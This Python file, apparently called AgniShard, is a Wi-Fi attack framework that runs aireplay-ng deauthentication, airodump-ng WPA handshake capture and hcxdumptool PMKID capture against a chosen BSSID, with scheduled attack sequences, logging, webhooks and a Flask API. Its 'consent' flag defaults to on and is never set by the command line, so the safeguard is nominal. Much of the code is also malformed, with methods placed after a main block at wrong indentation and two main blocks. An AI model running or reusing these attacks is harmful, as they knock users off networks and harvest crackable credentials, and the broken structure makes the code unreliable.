#!/usr/bin/env python3

# ╭─🧭 Chunk 0: Imports & Global Setup ─╮

import subprocess       # System command execution
import time             # Timestamping and delays
import threading        # Non-blocking execution
import os               # File handling and environment checks
import re               # Regex parsing
import json             # Structured logging
import logging          # Optional audit logging
from datetime import datetime  # Relic timestamping

# Symbolic glyphs for attack types
GLYPHS = {
    "deauth": "🧨",
    "handshake": "📡",
    "pmkid": "🧬"
}

# Tier classification for symbolic rendering
TIERS = {
    "deauth": "Relic",
    "handshake": "Relic",
    "pmkid": "Relic"
}

# ╰─🔗 End Chunk 0 ─╯

# ╭─🔥 Chunk 1: Initialization & Monitor Mode ─╮

class AgniShardCore:
    def __init__(self, interface):
        self.interface = interface
        self.attack_log = []

    def enable_monitor_mode(self):
        cmd = ["airmon-ng", "start", self.interface]
        try:
            subprocess.run(cmd, check=True)
        except subprocess.CalledProcessError as e:
            print(f"⚠️ Failed to enable monitor mode: {e}")

    def disable_monitor_mode(self):
        cmd = ["airmon-ng", "stop", self.interface]
        try:
            subprocess.run(cmd, check=True)
        except subprocess.CalledProcessError as e:
            print(f"⚠️ Failed to disable monitor mode: {e}")

# ╰─🧿 End Chunk 1 ─╯

# ╭─🧨 Chunk 2: Tool Execution & Ethical Gating ─╮

    def run_tool(self, cmd, simulate=False):
        if simulate:
            print(f"[DRY-RUN] {' '.join(cmd)}")
            return "Simulated output", None
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, check=True)
            return result.stdout, result.stderr
        except subprocess.CalledProcessError as e:
            return None, f"Subprocess error: {e}"
        except Exception as e:
            return None, f"Unexpected error: {e}"

# ╰─🛡️ End Chunk 2 ─╯

# ╭─⚔️ Chunk 3: Attack Invocation Layer ─╮

    def perform_deauth(self, bssid, channel, simulate=False, consent=True):
        if not consent:
            print("⛔ Consent not provided. Aborting deauth.")
            return
        self.enable_monitor_mode()
        try:
            cmd = ["aireplay-ng", "--deauth", "10", "-a", bssid, self.interface]
            out, err = self.run_tool(cmd, simulate)
            self.attack_log.append({
                "type": "deauth",
                "bssid": bssid,
                "channel": channel,
                "output": out,
                "error": err,
                "glyph": GLYPHS["deauth"],
                "tier": TIERS["deauth"],
                "timestamp": int(time.time())
            })
        finally:
            self.disable_monitor_mode()

    def capture_handshake(self, bssid, channel, duration=30, simulate=False, consent=True):
        if not consent:
            print("⛔ Consent not provided. Aborting handshake capture.")
            return
        self.enable_monitor_mode()
        try:
            filename = f"handshake_{bssid}_{int(time.time())}"
            cmd = ["airodump-ng", "--bssid", bssid, "--channel", str(channel), "--write", filename, self.interface]
            out, err = self.run_tool(cmd, simulate)
            time.sleep(duration)
            self.attack_log.append({
                "type": "handshake",
                "bssid": bssid,
                "channel": channel,
                "output": out,
                "error": err,
                "glyph": GLYPHS["handshake"],
                "tier": TIERS["handshake"],
                "timestamp": int(time.time())
            })
        finally:
            self.disable_monitor_mode()

    def capture_pmkid(self, simulate=False, consent=True):
        if not consent:
            print("⛔ Consent not provided. Aborting PMKID capture.")
            return
        self.enable_monitor_mode()
        try:
            cmd = ["hcxdumptool", "-i", self.interface, "--enable_status=1"]
            out, err = self.run_tool(cmd, simulate)
            self.attack_log.append({
                "type": "pmkid",
                "output": out,
                "error": err,
                "glyph": GLYPHS["pmkid"],
                "tier": TIERS["pmkid"],
                "timestamp": int(time.time())
            })
        finally:
            self.disable_monitor_mode()

# ╰─🕸️ End Chunk 3 ─╯

# ╭─📜 Chunk 4: Audit Log Rendering ─╮

    def render_attack_log(self):
        print("\n╭─🧾 AgniShard Attack Log ─╮")
        for entry in self.attack_log:
            glyph = entry.get("glyph", "❔")
            tier = entry.get("tier", "Unknown")
            bssid = entry.get("bssid", "N/A")
            channel = entry.get("channel", "N/A")
            print(f"{glyph} [{entry['type'].upper()}] → BSSID: {bssid}, Channel: {channel}")
            if entry["output"]:
                print("  ↪ Output:", entry["output"].strip())
            if entry["error"]:
                print("  ⚠ Error:", entry["error"].strip())
            print(f"  ⎋ Tier: {tier}")
            print("  ──")
        print("╰─🜂 End of Log ─╯\n")

# ╰─🔮 End Chunk 4 ─╯

# ╭─🧬 Chunk 5: Glyph Parser & Archetype Tagger ─╮

    def parse_glyphs(self):
        glyph_summary = {}
        for entry in self.attack_log:
            glyph = entry.get("glyph", "❔")
            glyph_summary[glyph] = glyph_summary.get(glyph, 0) + 1
        print("╭─🔣 Glyph Summary ─╮")
        for glyph, count in glyph_summary.items():
            print(f"  {glyph} × {count}")
        print("╰─🜚 End Glyph Summary ─╯")

    def tag_archetypes(self):
        for entry in self.attack_log:
            attack_type = entry["type"]
            if attack_type == "deauth":
                entry["archetype"] = "Disruptor"
            elif attack_type == "handshake":
                entry["archetype"] = "Harvester"
            elif attack_type == "pmkid":
                entry["archetype"] = "Extractor"
            else:
                entry["archetype"] = "Unknown"

# ╰─🧿 End Chunk 5 ─╯

# ╭─📦 Chunk 6: Relic Exporter ─╮

    def export_log_json(self, filepath="agni_log.json"):
        try:
            with open(filepath, "w") as f:
                json.dump(self.attack_log, f, indent=4)
            print(f"✅ Log exported to JSON → {filepath}")
        except Exception as e:
            print(f"⚠️ Failed to export JSON: {e}")

    def export_log_markdown(self, filepath="agni_log.md"):
        try:
            with open(filepath, "w") as f:
                f.write("# 🔥 AgniShard Attack Log\n\n")
                for entry in self.attack_log:
                    glyph = entry.get("glyph", "❔")
                    tier = entry.get("tier", "Unknown")
                    archetype = entry.get("archetype", "Unassigned")
                    bssid = entry.get("bssid", "N/A")
                    channel = entry.get("channel", "N/A")
                    f.write(f"## {glyph} {entry['type'].upper()}\n")
                    f.write(f"- **BSSID**: {bssid}\n")
                    f.write(f"- **Channel**: {channel}\n")
                    f.write(f"- **Tier**: {tier}\n")
                    f.write(f"- **Archetype**: {archetype}\n")
                    if entry["output"]:
                        f.write(f"- **Output**:\n```\n{entry['output'].strip()}\n```\n")
                    if entry["error"]:
                        f.write(f"- **Error**:\n```\n{entry['error'].strip()}\n```\n")
                    f.write("\n---\n\n")
            print(f"✅ Log exported to Markdown → {filepath}")
        except Exception as e:
            print(f"⚠️ Failed to export Markdown: {e}")

# ╰─📜 End Chunk 6 ─╯

# ╭─🛡️ Chunk 7: Consent Audit Renderer ─╮

    def render_consent_audit(self):
        print("\n╭─🧮 Consent & Simulation Audit ─╮")
        for entry in self.attack_log:
            attack = entry.get("type", "Unknown").upper()
            glyph = entry.get("glyph", "❔")
            bssid = entry.get("bssid", "N/A")
            channel = entry.get("channel", "N/A")
            output = entry.get("output", "")
            error = entry.get("error", "")
            simulated = "[DRY-RUN]" in output if output else False
            consent = "⛔" not in output if output else True

            print(f"{glyph} [{attack}] → BSSID: {bssid}, Channel: {channel}")
            print(f"  ✅ Consent: {'Yes' if consent else 'No'}")
            print(f"  🧪 Simulated: {'Yes' if simulated else 'No'}")
            if error:
                print(f"  ⚠ Error: {error.strip()}")
            print("  ──")
        print("╰─🜊 End Audit ─╯\n")

# ╰─🧿 End Chunk 7 ─╯

# ╭─🧾 Chunk 8: Symbolic Config Loader ─╮

    def load_symbolic_config(self, filepath="agni_config.json"):
        try:
            with open(filepath, "r") as f:
                config = json.load(f)

            # Override symbolic maps
            global GLYPHS, TIERS
            GLYPHS.update(config.get("glyphs", {}))
            TIERS.update(config.get("tiers", {}))

            # Optional: load archetype map
            self.archetype_map = config.get("archetypes", {})

            print(f"✅ Symbolic config loaded from {filepath}")
        except Exception as e:
            print(f"⚠️ Failed to load symbolic config: {e}")

    def apply_archetype_map(self):
        if not hasattr(self, "archetype_map"):
            print("⚠️ No archetype map loaded.")
            return
        for entry in self.attack_log:
            attack_type = entry["type"]
            entry["archetype"] = self.archetype_map.get(attack_type, "Unassigned")

# ╰─🧿 End Chunk 8 ─╯

# ╭─🖼️ Chunk 9: Mythic GUI Binder ─╮

    def get_attack_summary(self):
        summary = []
        for entry in self.attack_log:
            summary.append({
                "type": entry["type"],
                "bssid": entry.get("bssid", "N/A"),
                "channel": entry.get("channel", "N/A"),
                "glyph": entry.get("glyph", "❔"),
                "tier": entry.get("tier", "Unknown"),
                "archetype": entry.get("archetype", "Unassigned"),
                "status": "Simulated" if "[DRY-RUN]" in str(entry.get("output", "")) else "Executed"
            })
        return summary

    def get_glyph_counts(self):
        counts = {}
        for entry in self.attack_log:
            glyph = entry.get("glyph", "❔")
            counts[glyph] = counts.get(glyph, 0) + 1
        return counts

    def get_error_summary(self):
        errors = []
        for entry in self.attack_log:
            if entry.get("error"):
                errors.append({
                    "type": entry["type"],
                    "glyph": entry.get("glyph", "❔"),
                    "error": entry["error"].strip()
                })
        return errors

# ╰─🧿 End Chunk 9 ─╯

# ╭─⏳ Chunk 10: Relic Scheduler ─╮

    def schedule_attack(self, attack_fn, delay=10, *args, **kwargs):
        def delayed_execution():
            print(f"⏳ Waiting {delay} seconds before invoking {attack_fn.__name__}...")
            time.sleep(delay)
            attack_fn(*args, **kwargs)
            print(f"✅ {attack_fn.__name__} executed.")

        thread = threading.Thread(target=delayed_execution)
        thread.start()

    def batch_schedule(self, attack_plan):
        """
        attack_plan = [
            {"fn": self.perform_deauth, "delay": 5, "args": [bssid, channel], "kwargs": {"simulate": True}},
            {"fn": self.capture_handshake, "delay": 30, "args": [bssid, channel], "kwargs": {"simulate": False}},
        ]
        """
        for task in attack_plan:
            self.schedule_attack(task["fn"], task["delay"], *task.get("args", []), **task.get("kwargs", {}))

# ╰─🜓 End Chunk 10 ─╯

# ╭─🧿 Chunk 11: Symbolic Error Visualizer ─╮

    def visualize_errors(self):
        print("\n╭─⚠️ Symbolic Error Report ─╮")
        for entry in self.attack_log:
            error = entry.get("error")
            if error:
                glyph = entry.get("glyph", "❔")
                attack = entry.get("type", "Unknown").upper()
                archetype = entry.get("archetype", "Unassigned")
                print(f"{glyph} [{attack}] → Archetype: {archetype}")
                print(f"  ⚠ Error: {error.strip()}")
                if "monitor" in error.lower():
                    print("  🔍 Hint: Check if monitor mode was properly enabled or disabled.")
                elif "permission" in error.lower():
                    print("  🔐 Hint: Run with elevated privileges or verify tool access.")
                elif "not found" in error.lower():
                    print("  🧭 Hint: Ensure required tools are installed and in PATH.")
                else:
                    print("  🜁 Hint: Review command syntax or interface state.")
                print("  ──")
        print("╰─🜚 End Error Report ─╯\n")
        
# ╰─🧿 End Chunk 11 ─╯

# ╭─🧿 Chunk 12: Mythic CLI Interface ─╮

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="🜂 AgniShard Relic Interface")
    parser.add_argument("--interface", required=True, help="Wireless interface to use")
    parser.add_argument("--deauth", action="store_true", help="Perform deauth attack")
    parser.add_argument("--handshake", action="store_true", help="Capture handshake")
    parser.add_argument("--pmkid", action="store_true", help="Capture PMKID")
    parser.add_argument("--simulate", action="store_true", help="Dry-run mode")
    parser.add_argument("--bssid", help="Target BSSID")
    parser.add_argument("--channel", type=int, help="Target channel")
    parser.add_argument("--export", choices=["json", "md"], help="Export log format")

    args = parser.parse_args()
    core = AgniShardCore(args.interface)

    if args.deauth and args.bssid and args.channel:
        core.perform_deauth(args.bssid, args.channel, simulate=args.simulate)

    if args.handshake and args.bssid and args.channel:
        core.capture_handshake(args.bssid, args.channel, simulate=args.simulate)

    if args.pmkid:
        core.capture_pmkid(simulate=args.simulate)

    core.tag_archetypes()

    if args.export == "json":
        core.export_log_json()
    elif args.export == "md":
        core.export_log_markdown()

    core.render_attack_log()
    core.visualize_errors()
            
# ╭─🧿 Chunk 13: Relic Integrity Checker ─╮

    def check_integrity(self):
        print("\n╭─🧩 Relic Integrity Scan ─╮")
        issues_found = False
        for i, entry in enumerate(self.attack_log):
            missing = []
            for key in ["type", "glyph", "tier", "output", "error"]:
                if key not in entry:
                    missing.append(key)
            if missing:
                issues_found = True
                print(f"❌ Entry {i} missing fields: {', '.join(missing)}")
            elif entry["glyph"] not in GLYPHS.values():
                issues_found = True
                print(f"⚠️ Entry {i} has unknown glyph: {entry['glyph']}")
            elif entry["tier"] not in TIERS.values():
                issues_found = True
                print(f"⚠️ Entry {i} has unknown tier: {entry['tier']}")
        if not issues_found:
            print("✅ All entries structurally sound.")
        print("╰─🜎 End Integrity Scan ─╯\n")
        
# ╰─🧿 End Chunk 13 ─╯

   # ╭─📜 Chunk 14: YAML Ritual Loader ─╮

    def load_ritual_yaml(self, filepath="ritual.yaml"):
        try:
            import yaml
        except ImportError:
            print("⚠️ PyYAML not installed. Run: pip install pyyaml")
            return

        try:
            with open(filepath, "r") as f:
                ritual = yaml.safe_load(f)

            for step in ritual.get("sequence", []):
                fn_name = step.get("action")
                delay = step.get("delay", 0)
                args = step.get("args", [])
                kwargs = step.get("kwargs", {})
                fn = getattr(self, fn_name, None)
                if callable(fn):
                    self.schedule_attack(fn, delay, *args, **kwargs)
                else:
                    print(f"⚠️ Unknown ritual action: {fn_name}")
        except Exception as e:
            print(f"⚠️ Failed to load ritual YAML: {e}")
            
# ╰─🜚 End Chunk 14 ─╯

         # ╭─🧿 Chunk 15: Symbolic Dashboard Generator ─╮

    def render_dashboard(self):
        glyph_counts = self.get_glyph_counts()
        archetype_counts = {}
        for entry in self.attack_log:
            archetype = entry.get("archetype", "Unassigned")
            archetype_counts[archetype] = archetype_counts.get(archetype, 0) + 1

        print("\n╭─📊 AgniShard Symbolic Dashboard ─╮")
        print("🜂 Glyph Usage:")
        for glyph, count in glyph_counts.items():
            print(f"  {glyph} × {count}")

        print("\n🧬 Archetype Distribution:")
        for archetype, count in archetype_counts.items():
            print(f"  {archetype} × {count}")

        print("\n🧪 Simulation Summary:")
        simulated = sum(1 for e in self.attack_log if "[DRY-RUN]" in str(e.get("output", "")))
        executed = len(self.attack_log) - simulated
        print(f"  Simulated: {simulated}")
        print(f"  Executed: {executed}")
        print("╰─🜎 End Dashboard ─╯\n")
        
# ╰─🧿 End Chunk 15 ─╯

# ╭─📦 Chunk 16: Relic Archive Compressor ─╮

    def compress_relic_archive(self, archive_name=None):
        import zipfile

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        archive_name = archive_name or f"agni_relic_{timestamp}.zip"

        files_to_include = [
            "agni_log.json",
            "agni_log.md",
            "agni_config.json",
            "ritual.yaml"
        ]

        try:
            with zipfile.ZipFile(archive_name, "w") as zipf:
                for file in files_to_include:
                    if os.path.exists(file):
                        zipf.write(file)
                        print(f"📦 Added: {file}")
                    else:
                        print(f"⚠️ Skipped (not found): {file}")
            print(f"✅ Relic archive created → {archive_name}")
        except Exception as e:
            print(f"⚠️ Failed to create archive: {e}")

# ╰─🜓 End Chunk 16 ─╯

# ╭─🔔 Chunk 17: Mythic Notification Engine ─╮

    def notify(self, message, glyph="🔔", level="info"):
        levels = {
            "info": "🟢",
            "warn": "🟠",
            "error": "🔴",
            "success": "🟣"
        }
        prefix = levels.get(level, "🟢")
        print(f"{glyph} {prefix} {message}")

    def notify_on_attack(self, entry):
        glyph = entry.get("glyph", "❔")
        attack = entry.get("type", "Unknown").upper()
        status = "Simulated" if "[DRY-RUN]" in str(entry.get("output", "")) else "Executed"
        self.notify(f"{glyph} [{attack}] → {status}", glyph=glyph, level="success")

    def notify_on_error(self, entry):
        if entry.get("error"):
            glyph = entry.get("glyph", "❔")
            attack = entry.get("type", "Unknown").upper()
            self.notify(f"{glyph} [{attack}] ⚠ Error: {entry['error'].strip()}", glyph=glyph, level="error")

    def notify_on_archive(self, archive_name):
        self.notify(f"📦 Relic archive created → {archive_name}", glyph="📦", level="success")
        
# ╰─🜚 End Chunk 17 ─╯

# ╭─🧿 Chunk 18: Symbolic Threat Mapper ─╮

    def map_threat_profile(self):
        profile = {
            "Disruptor": 0,
            "Harvester": 0,
            "Extractor": 0,
            "Unassigned": 0
        }

        for entry in self.attack_log:
            archetype = entry.get("archetype", "Unassigned")
            profile[archetype] = profile.get(archetype, 0) + 1

        total = sum(profile.values())
        print("\n╭─🧠 Symbolic Threat Profile ─╮")
        for archetype, count in profile.items():
            percent = (count / total * 100) if total else 0
            glyph = {
                "Disruptor": "🧨",
                "Harvester": "📡",
                "Extractor": "🧬",
                "Unassigned": "❔"
            }.get(archetype, "❔")
            print(f"{glyph} {archetype}: {count} ({percent:.1f}%)")
        print("╰─🜎 End Threat Profile ─╯\n")
# ╰─🧿 End Chunk 18 ─╯

# ╭─🧿 Chunk 19: Relic Integrity Verifier ─╮

    def verify_file_hash(self, filepath, algorithm="sha256"):
        import hashlib

        if not os.path.exists(filepath):
            print(f"⚠️ File not found: {filepath}")
            return None

        try:
            hash_func = getattr(hashlib, algorithm)
        except AttributeError:
            print(f"⚠️ Unsupported hash algorithm: {algorithm}")
            return None

        hasher = hash_func()
        with open(filepath, "rb") as f:
            while chunk := f.read(8192):
                hasher.update(chunk)

        digest = hasher.hexdigest()
        print(f"🔐 {algorithm.upper()} hash for {filepath}: {digest}")
        return digest

    def verify_relic_bundle(self, files=None, algorithm="sha256"):
        files = files or [
            "agni_log.json",
            "agni_log.md",
            "agni_config.json",
            "ritual.yaml"
        ]
        print("\n╭─🧿 Relic Hash Verification ─╮")
        for file in files:
            self.verify_file_hash(file, algorithm=algorithm)
        print("╰─🜎 End Verification ─╯\n")
        
# ╰─🧿 End Chunk 19 ─╯

# ╭─🌐 Chunk 20: Mythic Webhook Dispatcher ─╮

    def dispatch_webhook(self, url, payload):
        import requests
        try:
            response = requests.post(url, json=payload, timeout=5)
            status = response.status_code
            if status == 200:
                print(f"🌐 Webhook dispatched successfully → {url}")
            else:
                print(f"⚠️ Webhook failed with status {status}")
        except Exception as e:
            print(f"⚠️ Webhook dispatch error: {e}")

    def notify_attack_webhook(self, entry, url):
        payload = {
            "type": entry.get("type"),
            "glyph": entry.get("glyph"),
            "tier": entry.get("tier"),
            "archetype": entry.get("archetype", "Unassigned"),
            "status": "Simulated" if "[DRY-RUN]" in str(entry.get("output", "")) else "Executed",
            "timestamp": datetime.now().isoformat()
        }
        self.dispatch_webhook(url, payload)

    def notify_archive_webhook(self, archive_name, url):
        payload = {
            "event": "archive_created",
            "file": archive_name,
            "timestamp": datetime.now().isoformat()
        }
        self.dispatch_webhook(url, payload)
        
# ╰─🜚 End Chunk 20 ─╯

# ╭─🕰️ Chunk 21: Symbolic Timeline Renderer ─╮

    def render_timeline(self):
        print("\n╭─📜 AgniShard Symbolic Timeline ─╮")
        sorted_log = sorted(self.attack_log, key=lambda e: e.get("timestamp", 0))

        for entry in sorted_log:
            glyph = entry.get("glyph", "❔")
            attack = entry.get("type", "Unknown").upper()
            archetype = entry.get("archetype", "Unassigned")
            ts = entry.get("timestamp", int(time.time()))
            readable = datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
            status = "Simulated" if "[DRY-RUN]" in str(entry.get("output", "")) else "Executed"

            print(f"{readable} → {glyph} [{attack}] • {archetype} • {status}")
        print("╰─🜎 End Timeline ─╯\n")
# ╰─🧿 End Chunk 21 ─╯

# ╭─🔁 Chunk 22: Relic Resurrection Engine ─╮

    def resurrect_from_archive(self, archive_path="agni_relic.zip"):
        import zipfile
        try:
            with zipfile.ZipFile(archive_path, "r") as zipf:
                zipf.extractall()
                print(f"🧙 Relic resurrected from → {archive_path}")
        except Exception as e:
            print(f"⚠️ Resurrection failed: {e}")
            
# ╰─🜚 End Chunk 22 ─╯

# ╭─🔊 Chunk 23: Mythic Voice Synthesizer ─╮

    def speak_log_entry(self, entry):
        try:
            import pyttsx3
            engine = pyttsx3.init()
            glyph = entry.get("glyph", "❔")
            attack = entry.get("type", "Unknown").upper()
            archetype = entry.get("archetype", "Unassigned")
            status = "Simulated" if "[DRY-RUN]" in str(entry.get("output", "")) else "Executed"
            message = f"{glyph} {attack} performed as {archetype}. Status: {status}."
            engine.say(message)
            engine.runAndWait()
        except Exception as e:
            print(f"⚠️ Voice synthesis failed: {e}")
            
# ╰─🜚 End Chunk 23 ─╯

# ╭─🧿 Chunk 24–25: Visualization Hooks + Archetype Balancer ─╮

    def get_visualization_data(self):
        data = {
            "glyphs": self.get_glyph_counts(),
            "archetypes": {},
            "timeline": []
        }

        for entry in self.attack_log:
            archetype = entry.get("archetype", "Unassigned")
            data["archetypes"][archetype] = data["archetypes"].get(archetype, 0) + 1

            ts = entry.get("timestamp", int(time.time()))
            readable = datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
            data["timeline"].append({
                "time": readable,
                "glyph": entry.get("glyph", "❔"),
                "type": entry.get("type", "Unknown").upper(),
                "archetype": archetype,
                "status": "Simulated" if "[DRY-RUN]" in str(entry.get("output", "")) else "Executed"
            })

        return data

    def suggest_archetype_balance(self):
        counts = {}
        for entry in self.attack_log:
            archetype = entry.get("archetype", "Unassigned")
            counts[archetype] = counts.get(archetype, 0) + 1

        total = sum(counts.values())
        ideal = total // 3 if total else 0
        print("\n╭─⚖️ Archetype Balance Suggestion ─╮")
        for archetype in ["Disruptor", "Harvester", "Extractor"]:
            actual = counts.get(archetype, 0)
            delta = ideal - actual
            glyph = {
                "Disruptor": "🧨",
                "Harvester": "📡",
                "Extractor": "🧬"
            }.get(archetype, "❔")
            if delta > 0:
                print(f"{glyph} {archetype}: Add {delta} more to balance.")
            elif delta < 0:
                print(f"{glyph} {archetype}: Reduce by {-delta} for equilibrium.")
            else:
                print(f"{glyph} {archetype}: Balanced.")
        print("╰─🜎 End Suggestion ─╯\n")
        
# ╰─🧿 End Chunk 24–25 ─╯

# ╭─🧿 Chunk 26–27: Manifest Generator + Mythic API ─╮

    def generate_manifest(self, filepath="agni_manifest.json"):
        manifest = {
            "created": datetime.now().isoformat(),
            "total_attacks": len(self.attack_log),
            "glyphs": self.get_glyph_counts(),
            "archetypes": {},
            "hashes": {}
        }

        for entry in self.attack_log:
            archetype = entry.get("archetype", "Unassigned")
            manifest["archetypes"][archetype] = manifest["archetypes"].get(archetype, 0) + 1

        for file in ["agni_log.json", "agni_log.md", "agni_config.json"]:
            digest = self.verify_file_hash(file)
            if digest:
                manifest["hashes"][file] = digest

        try:
            with open(filepath, "w") as f:
                json.dump(manifest, f, indent=4)
            print(f"📜 Manifest generated → {filepath}")
        except Exception as e:
            print(f"⚠️ Manifest generation failed: {e}")

    def launch_api(self, port=8080):
        try:
            from flask import Flask, jsonify

            app = Flask("AgniShardAPI")

            @app.route("/glyphs")
            def glyphs():
                return jsonify(self.get_glyph_counts())

            @app.route("/archetypes")
            def archetypes():
                counts = {}
                for entry in self.attack_log:
                    archetype = entry.get("archetype", "Unassigned")
                    counts[archetype] = counts.get(archetype, 0) + 1
                return jsonify(counts)

            @app.route("/timeline")
            def timeline():
                return jsonify(self.get_visualization_data()["timeline"])

            print(f"🌐 AgniShard API running on port {port}")
            app.run(port=port)

        except Exception as e:
            print(f"⚠️ API launch failed: {e}")

# ╰─🜚 End Chunk 26–27 ─╯

# ╭─🛡️ Chunk 28–30: Guardian + Signature + Lore ─╮

    def enforce_guardrails(self, entry):
        if not entry.get("consent", True):
            print(f"⛔ Consent missing for {entry['type']}. Switching to dry-run.")
            entry["simulate"] = True
            entry["output"] = "[DRY-RUN] Consent not provided."
            entry["error"] = None
            entry["glyph"] = GLYPHS.get(entry["type"], "❔")
            entry["tier"] = TIERS.get(entry["type"], "Unknown")
            entry["timestamp"] = int(time.time())
            entry["archetype"] = self.archetype_map.get(entry["type"], "Unassigned")
            self.attack_log.append(entry)

    def sign_manifest(self, manifest_path="agni_manifest.json", key_path="private.pem"):
        try:
            from cryptography.hazmat.primitives import hashes, serialization
            from cryptography.hazmat.primitives.asymmetric import padding
            from cryptography.hazmat.backends import default_backend

            with open(manifest_path, "rb") as f:
                data = f.read()
            with open(key_path, "rb") as kf:
                private_key = serialization.load_pem_private_key(kf.read(), password=None, backend=default_backend())

            signature = private_key.sign(
                data,
                padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH),
                hashes.SHA256()
            )

            sig_path = manifest_path.replace(".json", ".sig")
            with open(sig_path, "wb") as sf:
                sf.write(signature)
            print(f"🔏 Manifest signed → {sig_path}")
        except Exception as e:
            print(f"⚠️ Signature failed: {e}")

    def compile_lore(self, filepath="agni_lore.md"):
        try:
            with open(filepath, "w") as f:
                f.write("# 🔥 AgniShard Relic Lore\n\n")
                f.write(f"**Created**: {datetime.now().isoformat()}\n\n")
                f.write("## Glyphic Summary\n")
                for glyph, count in self.get_glyph_counts().items():
                    f.write(f"- {glyph} × {count}\n")

                f.write("\n## Archetypal Spread\n")
                archetypes = {}
                for entry in self.attack_log:
                    archetype = entry.get("archetype", "Unassigned")
                    archetypes[archetype] = archetypes.get(archetype, 0) + 1
                for archetype, count in archetypes.items():
                    f.write(f"- {archetype} × {count}\n")

                f.write("\n## Ritual Timeline\n")
                for entry in sorted(self.attack_log, key=lambda e: e.get("timestamp", 0)):
                    ts = datetime.fromtimestamp(entry.get("timestamp", int(time.time()))).strftime("%Y-%m-%d %H:%M:%S")
                    glyph = entry.get("glyph", "❔")
                    attack = entry.get("type", "Unknown").upper()
                    status = "Simulated" if "[DRY-RUN]" in str(entry.get("output", "")) else "Executed"
                    f.write(f"- {ts} → {glyph} {attack} • {status}\n")

            print(f"📜 Lore compiled → {filepath}")
        except Exception as e:
            print(f"⚠️ Lore compilation failed: {e}")

# ╰─🜚 End Chunk 28–30 ─╯

# ╭─🜂 Relic Invocation Entry ─╮
if __name__ == "__main__":
    core = AgniShardCore("wlan0")
    core.load_symbolic_config()
    core.tag_archetypes()
    core.render_dashboard()
    core.render_timeline()
    core.generate_manifest()
    core.compile_lore()
    core.compress_relic_archive()
    core.verify_relic_bundle()
    print("🔚 AgniShard relic sealed and invoked.")
# ╰─🜎 End of Relic ─╯
   
   # ╭─🛡️ Chunk 31: Relic Recovery Engine ─╮

    def recover_attack_log(self, filepath="agni_log.json"):
        try:
            with open(filepath, "r") as f:
                log = json.load(f)
        except Exception as e:
            print(f"⚠️ Failed to load attack log: {e}")
            return

        repaired = []
        for i, entry in enumerate(log):
            fixed = entry.copy()
            missing = []

            for key in ["type", "glyph", "tier", "output", "error", "timestamp"]:
                if key not in fixed:
                    missing.append(key)
                    if key == "type":
                        fixed[key] = "unknown"
                    elif key == "glyph":
                        fixed[key] = GLYPHS.get(fixed.get("type", "unknown"), "❔")
                    elif key == "tier":
                        fixed[key] = TIERS.get(fixed.get("type", "unknown"), "Relic")
                    elif key == "output":
                        fixed[key] = "[RECOVERED] No output"
                    elif key == "error":
                        fixed[key] = None
                    elif key == "timestamp":
                        fixed[key] = int(time.time())

            if "archetype" not in fixed:
                fixed["archetype"] = self.archetype_map.get(fixed["type"], "Unassigned")

            if missing:
                print(f"🛠️ Entry {i} repaired → Missing: {', '.join(missing)}")

            repaired.append(fixed)

        self.attack_log = repaired
        print(f"✅ Attack log recovered and loaded → {filepath}")

    def recover_config(self, filepath="agni_config.json"):
        if not os.path.exists(filepath):
            print(f"⚠️ Config missing. Regenerating default → {filepath}")
            default_config = {
                "glyphs": GLYPHS,
                "tiers": TIERS,
                "archetypes": {
                    "deauth": "Disruptor",
                    "handshake": "Harvester",
                    "pmkid": "Extractor"
                }
            }
            try:
                with open(filepath, "w") as f:
                    json.dump(default_config, f, indent=4)
                print("✅ Default config regenerated.")
            except Exception as e:
                print(f"⚠️ Failed to regenerate config: {e}")
        else:
            print("✅ Config file exists. No recovery needed.")

# ╰─🜚 End Chunk 31 ─╯     

